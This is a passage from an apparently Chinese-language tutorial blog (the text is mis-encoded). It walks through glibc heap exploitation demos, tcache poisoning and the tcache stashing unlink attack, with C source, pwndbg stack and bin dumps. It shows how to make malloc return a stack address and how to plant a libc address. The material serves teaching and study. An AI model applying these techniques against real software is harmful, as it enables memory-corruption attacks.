class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">In file: /pwn/tcache_poisoning.c</span><br><span class="line">   <span class="number">30</span></span><br><span class="line">   <span class="number">31</span> <span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p -&gt; %p ].\n&quot;</span>, b, a);</span><br><span class="line">   <span class="number">32</span> <span class="built_in">printf</span>(<span class="string">&quot;We overwrite the first %lu bytes (fd/next pointer) of the data at %p\n&quot;</span></span><br><span class="line">   <span class="number">33</span>    <span class="string">&quot;to point to the location to control (%p).\n&quot;</span>, <span class="keyword">sizeof</span>(<span class="keyword">intptr_t</span>), b, &amp;stack_var);</span><br><span class="line">   <span class="number">34</span> b[<span class="number">0</span>] = (<span class="keyword">intptr_t</span>)&amp;stack_var;</span><br><span class="line"> â–º <span class="number">35</span> <span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p -&gt; %p ].\n&quot;</span>, b, &amp;stack_var);</span><br><span class="line">   <span class="number">36</span></span><br><span class="line">   <span class="number">37</span> <span class="built_in">printf</span>(<span class="string">&quot;1st malloc(128): %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">128</span>));</span><br><span class="line">   <span class="number">38</span> <span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p ].\n&quot;</span>, &amp;stack_var);</span><br><span class="line">   <span class="number">39</span></span><br><span class="line">   <span class="number">40</span> <span class="keyword">intptr_t</span> *c = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ STACK ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>â”‚ rsp  <span class="number">0x7fff96c64620</span> â€”â–¸ <span class="number">0x7f5ea82fbfc8</span> (__exit_funcs_lock) â—‚â€” <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>â”‚ rdx  <span class="number">0x7fff96c64628</span> â€”â–¸ <span class="number">0x55ce96f65410</span> (__libc_csu_init) â—‚â€” endbr64</span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>â”‚      <span class="number">0x7fff96c64630</span> â€”â–¸ <span class="number">0x55ce97ce62a0</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>â”‚      <span class="number">0x7fff96c64638</span> â€”â–¸ <span class="number">0x55ce97ce6330</span> â€”â–¸ <span class="number">0x7fff96c64628</span> â€”â–¸ <span class="number">0x55ce96f65410</span> (__libc_csu_init) â—‚â€” endbr64</span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>â”‚      <span class="number">0x7fff96c64640</span> â€”â–¸ <span class="number">0x7fff96c64740</span> â—‚â€” <span class="number">0x1</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>â”‚      <span class="number">0x7fff96c64648</span> â—‚â€” <span class="number">0x6690dce44b0a5500</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>â”‚ rbp  <span class="number">0x7fff96c64650</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>â”‚      <span class="number">0x7fff96c64658</span> â€”â–¸ <span class="number">0x7f5ea81320b3</span> (__libc_start_main+<span class="number">243</span>) â—‚â€” mov    edi, eax</span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ BACKTRACE ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line"> â–º f <span class="number">0</span>     <span class="number">55</span>ce96f65343 main+<span class="number">314</span></span><br><span class="line">   f <span class="number">1</span>     <span class="number">7f</span>5ea81320b3 __libc_start_main+<span class="number">243</span></span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x90</span> [  <span class="number">2</span>]: <span class="number">0x55ce97ce6330</span> â€”â–¸ <span class="number">0x7fff96c64628</span> â€”â–¸ <span class="number">0x55ce96f65410</span> (__libc_csu_init) â—‚â€” ...</span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x0</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å°±å‘ç° å˜æˆäº† b â€”&gt; &amp;stack_var ,ç„¶åæˆ‘ä»¬åªéœ€ malloc ä¸¤æ¬¡å°±èƒ½å°†æ ˆåœ°å€æ‹¿åˆ°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ SOURCE (CODE) ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">In file: /pwn/tcache_poisoning.c</span><br><span class="line">   <span class="number">36</span></span><br><span class="line">   <span class="number">37</span> <span class="built_in">printf</span>(<span class="string">&quot;1st malloc(128): %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">128</span>));</span><br><span class="line">   <span class="number">38</span> <span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p ].\n&quot;</span>, &amp;stack_var);</span><br><span class="line">   <span class="number">39</span></span><br><span class="line">   <span class="number">40</span> <span class="keyword">intptr_t</span> *c = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line"> â–º <span class="number">41</span> <span class="built_in">printf</span>(<span class="string">&quot;2nd malloc(128): %p\n&quot;</span>, c);</span><br><span class="line">   <span class="number">42</span> <span class="built_in">printf</span>(<span class="string">&quot;We got the control\n&quot;</span>);</span><br><span class="line">   <span class="number">43</span></span><br><span class="line">   <span class="number">44</span> assert((<span class="keyword">long</span>)&amp;stack_var == (<span class="keyword">long</span>)c);</span><br><span class="line">   <span class="number">45</span> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">   <span class="number">46</span> &#125;</span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ STACK ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>â”‚ rsp     <span class="number">0x7fff96c64620</span> â€”â–¸ <span class="number">0x7f5ea82fbfc8</span> (__exit_funcs_lock) â—‚â€” <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>â”‚ rax r8  <span class="number">0x7fff96c64628</span> â€”â–¸ <span class="number">0x55ce96f65410</span> (__libc_csu_init) â—‚â€” endbr64</span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>â”‚         <span class="number">0x7fff96c64630</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>â”‚         <span class="number">0x7fff96c64638</span> â€”â–¸ <span class="number">0x55ce97ce6330</span> â€”â–¸ <span class="number">0x7fff96c64628</span> â€”â–¸ <span class="number">0x55ce96f65410</span> (__libc_csu_init) â—‚â€” endbr64</span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>â”‚         <span class="number">0x7fff96c64640</span> â€”â–¸ <span class="number">0x7fff96c64628</span> â€”â–¸ <span class="number">0x55ce96f65410</span> (__libc_csu_init) â—‚â€” endbr64</span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>â”‚         <span class="number">0x7fff96c64648</span> â—‚â€” <span class="number">0x6690dce44b0a5500</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>â”‚ rbp     <span class="number">0x7fff96c64650</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>â”‚         <span class="number">0x7fff96c64658</span> â€”â–¸ <span class="number">0x7f5ea81320b3</span> (__libc_start_main+<span class="number">243</span>) â—‚â€” mov    edi, eax</span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ BACKTRACE ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line"> â–º f <span class="number">0</span>     <span class="number">55</span>ce96f653a3 main+<span class="number">410</span></span><br><span class="line">   f <span class="number">1</span>     <span class="number">7f</span>5ea81320b3 __libc_start_main+<span class="number">243</span></span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">pwndbg&gt; p c</span><br><span class="line">$<span class="number">6</span> = (<span class="keyword">intptr_t</span> *) <span class="number">0x7fff96c64628</span></span><br></pre></td></tr></table></figure><h3 id="10-tcache-stashing-unlink-attack"><a href="#10-tcache-stashing-unlink-attack" class="headerlink" title="10. tcache_stashing_unlink_attack"></a>10. tcache_stashing_unlink_attack</h3><p>tcache ä¸Šçš„ stashing unlink attack</p><p>å½“ä½ èƒ½å¤Ÿè¦†ç›–victor-&gt;bkæŒ‡é’ˆæ—¶ï¼Œå¯ä»¥ä½¿ç”¨è¿™ä¸ªæŠ€æœ¯ã€‚æ­¤å¤–ï¼Œè‡³å°‘éœ€è¦ç”¨callocåˆ†é…ä¸€ä¸ªchunkã€‚</p><p>åœ¨glibcä¸­ï¼Œå°†smallbinæ”¾å…¥tcacheçš„æœºåˆ¶ç»™äº†æˆ‘ä»¬å‘åŠ¨æ”»å‡»çš„æœºä¼š. è¿™ç§æŠ€æœ¯å…è®¸æˆ‘ä»¬æŠŠlibc addrå†™åˆ°ä»»ä½•æˆ‘ä»¬æƒ³è¦çš„åœ°æ–¹ï¼Œå¹¶åœ¨ä»»ä½•éœ€è¦çš„åœ°æ–¹åˆ›å»ºä¸€ä¸ªå‡çš„chunkã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å°†åœ¨å †æ ˆä¸Šåˆ›å»ºä¸€ä¸ªå‡çš„chunk.</p><p>ä¾‹å¦‚æ­¤æ—¶æˆ‘ä»¬åœ¨æ ˆä¸Šä¼ªé€ ä¸€ä¸ª chunk</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">   <span class="number">22</span>     stack_var[<span class="number">3</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(&amp;stack_var[<span class="number">2</span>]);</span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">pwndbg&gt; x/<span class="number">20</span>gx stack_var</span><br><span class="line"><span class="number">0x7fffea4571c0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffea4571d0</span>:<span class="number">0x0000000000000000</span><span class="number">0x00007fffea4571d0</span></span><br><span class="line"><span class="number">0x7fffea4571e0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffea4571f0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffea457200</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffea457210</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffea457220</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffea457230</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffea457240</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffea457250</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure><p>é¦–å…ˆè®©æˆ‘ä»¬å‘ fake_chunk-&gt;bk å†™ä¸€ä¸ªå¯å†™çš„åœ°å€ï¼Œä»¥ç»•è¿‡ glibc ä¸­çš„ bck-&gt;fd = binã€‚è¿™é‡Œæˆ‘ä»¬é€‰æ‹©stack_var[2]çš„åœ°å€ä½œä¸ºfake bkã€‚ä¹‹åæˆ‘ä»¬å¯ä»¥çœ‹åˆ°*(fake_chunk-&gt;bk + 0x10)ï¼Œä¹Ÿå°±æ˜¯stack_var[4]åœ¨æ”»å‡»åå°†æˆä¸ºlibc addr</p><p>malloc 9 ä¸ªchunk</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">29</span>     <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line"><span class="number">30</span>         chunk_lis[i] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>*)<span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line"><span class="number">31</span>     &#125;</span><br></pre></td></tr></table></figure><p>free 7 ä¸ªchunkï¼Œå¡«æ»¡ tcache</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">36</span>     <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">3</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">  <span class="number">37</span>         <span class="built_in">free</span>(chunk_lis[i]);</span><br><span class="line">  <span class="number">38</span>     &#125;</span><br><span class="line">  <span class="number">39</span></span><br><span class="line">â–º <span class="number">40</span>     <span class="built_in">printf</span>(<span class="string">&quot;As you can see, chunk1 &amp; [chunk3,chunk8] are put into tcache bins while chunk0 and chunk2 will be put into unsorted bin.\n\n&quot;</span>);</span><br><span class="line">  <span class="number">41</span></span><br><span class="line">  <span class="number">42</span>     <span class="comment">//last tcache bin</span></span><br><span class="line">  <span class="number">43</span>     <span class="built_in">free</span>(chunk_lis[<span class="number">1</span>]);</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæˆ‘ä»¬æ³¨æ„ä¸€ä¸‹ï¼Œ tcache bin çš„æœ€åä¸€ä¸ªbinæ˜¯  chunk_lis[1]</p><p>ç„¶ååœ¨ unsort bin é‡Œæ”¾å…¥ä¸¤ä¸ª chunk</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">   <span class="number">44</span>     <span class="comment">//now they are put into unsorted bin</span></span><br><span class="line"> â–º <span class="number">45</span>     <span class="built_in">free</span>(chunk_lis[<span class="number">0</span>]);</span><br><span class="line">   <span class="number">46</span>     <span class="built_in">free</span>(chunk_lis[<span class="number">2</span>]);</span><br><span class="line">   <span class="number">47</span></span><br><span class="line">     â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0xa0</span> [  <span class="number">7</span>]: <span class="number">0x55a4674bc340</span> â€”â–¸ <span class="number">0x55a4674bc7a0</span> â€”â–¸ <span class="number">0x55a4674bc700</span> â€”â–¸ <span class="number">0x55a4674bc660</span> â€”â–¸ <span class="number">0x55a4674bc5c0</span> â€”â–¸ <span class="number">0x55a4674bc520</span> â€”â–¸ <span class="number">0x55a4674bc480</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x55a4674bc3d0</span> â€”â–¸ <span class="number">0x55a4674bc290</span> â€”â–¸ <span class="number">0x7fd3f030cbe0</span> (main_arena+<span class="number">96</span>) â—‚â€” <span class="number">0x55a4674bc3d0</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>ç„¶ååˆ†é…ä¸€ä¸ªå¤§äº 0x90 çš„chunk ï¼Œè¿™ä¸ªæ—¶å€™ chunk0 å’Œ chunk2 ä¼šè¢«æ”¾å…¥ smallbin é‡Œ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">â–º <span class="number">49</span>     <span class="built_in">printf</span>(<span class="string">&quot;Now we alloc a chunk larger than 0x90 to put chunk0 and chunk2 into small bin.\n\n&quot;</span>);</span><br><span class="line">  <span class="number">50</span></span><br><span class="line">  <span class="number">51</span>     <span class="built_in">malloc</span>(<span class="number">0xa0</span>);<span class="comment">// size &gt; 0x90</span></span><br></pre></td></tr></table></figure><p>ç„¶åï¼Œæˆ‘å† malloc ä¸¤ä¸ª chunk ï¼Œä»tcache bin å–å‡ºä¸¤ä¸ª chunk</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0xa0</span> [  <span class="number">5</span>]: <span class="number">0x55a4674bc700</span> â€”â–¸ <span class="number">0x55a4674bc660</span> â€”â–¸ <span class="number">0x55a4674bc5c0</span> â€”â–¸ <span class="number">0x55a4674bc520</span> â€”â–¸ <span class="number">0x55a4674bc480</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x0</span></span><br><span class="line">smallbins</span><br><span class="line"><span class="number">0xa0</span>: <span class="number">0x55a4674bc3d0</span> â€”â–¸ <span class="number">0x55a4674bc290</span> â€”â–¸ <span class="number">0x7fd3f030cc70</span> (main_arena+<span class="number">240</span>) â—‚â€” <span class="number">0x55a4674bc3d0</span></span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>ç„¶åæ­¤æ—¶ï¼Œæˆ‘ä»¬å‡è®¾æœ‰ä¸€ä¸ªæ¼æ´èƒ½ä¿®æ”¹ chunklis[2]çš„ bck</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">61</span>     <span class="comment">//change victim-&gt;bck</span></span><br><span class="line">  <span class="number">62</span>     <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">â–º <span class="number">63</span>     chunk_lis[<span class="number">2</span>][<span class="number">1</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)stack_var;</span><br><span class="line">  <span class="number">64</span>     <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">  <span class="number">65</span></span><br></pre></td></tr></table></figure><p>æ­¤æ—¶ bins å¦‚ä¸‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0xa0</span> [  <span class="number">5</span>]: <span class="number">0x55a4674bc700</span> â€”â–¸ <span class="number">0x55a4674bc660</span> â€”â–¸ <span class="number">0x55a4674bc5c0</span> â€”â–¸ <span class="number">0x55a4674bc520</span> â€”â–¸ <span class="number">0x55a4674bc480</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x0</span></span><br><span class="line">smallbins</span><br><span class="line"><span class="number">0xa0</span> [corrupted]</span><br><span class="line">FD: <span class="number">0x55a4674bc3d0</span> â€”â–¸ <span class="number">0x55a4674bc290</span> â€”â–¸ <span class="number">0x7fd3f030cc70</span> (main_arena+<span class="number">240</span>) â—‚â€” <span class="number">0x55a4674bc3d0</span></span><br><span class="line">BK: <span class="number">0x55a4674bc290</span> â€”â–¸ <span class="number">0x55a4674bc3d0</span> â€”â–¸ <span class="number">0x7fffea4571c0</span> â€”â–¸ <span class="number">0x7fffea4571d0</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>ç„¶åæˆ‘ä»¬ calloc ä¸€ä¸ªæ–° chunk ï¼Œæ­¤æ—¶å°† chunk[0] (calloc ä¸ä¼šä» tcache å–)</p><p>smallbin çš„chunk ä¼šè¢«é‡æ–°å¡«å……åˆ° tache biné‡Œï¼Œç„¶åæˆ‘ä»¬å¯ä»¥é€šè¿‡ tcache æ²¡æœ‰ä¸¥æ 